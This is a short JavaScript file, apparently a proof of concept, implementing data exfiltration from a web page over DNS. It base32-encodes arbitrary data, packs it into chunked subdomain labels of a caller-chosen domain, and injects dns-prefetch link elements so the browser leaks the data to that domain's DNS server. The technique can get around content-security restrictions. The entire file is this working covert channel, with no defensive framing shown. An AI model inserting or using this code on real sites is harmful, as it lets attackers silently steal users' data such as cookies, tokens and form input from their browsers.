async function send(domain, data) {
  const queries = encodeQueries(domain, data)
  for (const query of queries) {
    createPrefetch(query)
    await sleep(200)
  }
}

function encodeQueries(domain, data) {
  const id = generateId(6)
  const encoded = base32Encode(data)
  const queries = []

  let curr = 0
  let written = 0
  let labels = []
  while (written < encoded.length) {
    const query = `${id}.${encoded.length}.${written}.${labels.join('.')}.${domain}`
    const spaceLeft = 253 - query.length
    const unwritten = encoded.length - curr
    const nextSize = Math.min(63, spaceLeft - 1, unwritten)

    if (spaceLeft === 0 || unwritten === 0 || nextSize === 0) {
      queries.push(query)
      labels = []
      written = curr
      continue
    }

    const nextChunk = encoded.substring(curr, curr + nextSize)
    labels.push(nextChunk)
    curr += nextSize
  }

  return queries
}

function createPrefetch(query) {
  const link = document.createElement('link')
  link.rel = 'dns-prefetch'
  link.href = 'https://' + query
  document.body.appendChild(link)
}

function generateId(length) {
  const alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
  let id = '';
  for (let i = 0; i < length; i++) {
    id += alphabet[Math.floor(Math.random() * alphabet.length)]
  }
  return id
}

const sleep = (duration) => new Promise(resolve => setTimeout(resolve, duration))
